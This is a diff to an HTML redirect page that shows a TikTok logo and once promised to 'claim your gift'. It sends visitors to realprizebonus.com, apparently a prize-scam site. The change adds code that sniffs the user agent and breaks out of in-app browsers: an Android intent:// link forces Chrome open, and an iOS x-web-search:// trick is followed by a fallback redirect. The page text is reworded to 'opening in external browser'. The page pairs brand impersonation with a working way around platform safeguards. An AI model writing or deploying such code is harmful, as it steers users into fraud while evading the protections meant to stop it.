@@ -44,21 +44,30 @@
 <body>
     <img id="tiktok-logo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjc3uKUdgtRlsd-LUzyjH-h2xQUtTci7MsmUGDJNVwd3RKb3GxreFfG6_a17bc81MLr72clzGfA5c_N2_bl9n_axXYSHis6ekKU469IBOMfd4aRPu8HD0Fq8vYz7iNm7CTs1Ps1sNFd7hV2RXlJld4cpodJ8sNCiZlpu46ekPChAnphsZTGQdpJbhZYXNlh/s1080/548511907.gif" alt="TikTok Logo">
     
-    <p id="redirect-text"><strong>Please wait, redirecting to claim your gift... ✅</strong></p>
+    <p id="redirect-text"><strong>Please wait, opening in external browser... ✅</strong></p>
 
     <script>
-        function doRedirect() {
-            var targetUrl = 'https://realprizebonus.com/?s1=tiny';
-            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        function escapeInAppBrowser() {
+            var rawUrl = 'realprizebonus.com/?s1=tiny';
+            var fullUrl = 'https://' + rawUrl;
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
 
-            if (/android/i.test(userAgent)) {
-                window.location.replace(targetUrl);
+            var isAndroid = /android/i.test(ua);
+            var isIOS = /(iphone|ipad|ipod)/i.test(ua);
+
+            if (isAndroid) {
+                window.location.href = 'intent://' + rawUrl + '#Intent;scheme=https;package=com.android.chrome;end';
+            } else if (isIOS) {
+                window.location.href = 'x-web-search://?' + fullUrl;
+                setTimeout(function() {
+                    window.location.href = fullUrl;
+                }, 300);
             } else {
-                window.location.href = targetUrl;
+                window.location.href = fullUrl;
             }
         }
 
-        setTimeout(doRedirect, 800);
+        setTimeout(escapeInAppBrowser, 500);
     </script>
 </body>
 </html>
